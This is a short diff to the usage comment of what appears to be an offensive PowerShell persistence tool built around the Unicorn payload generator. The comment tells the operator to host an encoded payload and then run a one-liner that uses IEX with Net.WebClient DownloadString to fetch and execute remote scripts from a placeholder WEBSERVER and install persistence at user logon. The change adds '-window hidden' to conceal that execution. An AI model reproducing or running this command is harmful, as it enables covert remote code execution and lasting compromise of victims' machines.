@@ -6,7 +6,7 @@
 # 1) Use Unicorn to generate your encoded powershell command. This command will be used for persistence when the user logs in.
 # 2) Save to a text file somewhere you can download it.
 # 3) Call this from your shell:
-#	powershell.exe -exec bypass -noni -c "IEX (New-Object Net.WebClient).DownloadString('http://WEBSERVER/powershell-persist.ps1'); Add-Persistence http://WEBSERVER/powershell_attack.txt"
+#	powershell.exe -window hidden -exec bypass -noni -c "IEX (New-Object Net.WebClient).DownloadString('http://WEBSERVER/powershell-persist.ps1'); Add-Persistence http://WEBSERVER/powershell_attack.txt"
 # 
 # Kudos to @slobtresix for the initial model. Modified to work directly with unicorn payloads.
 #
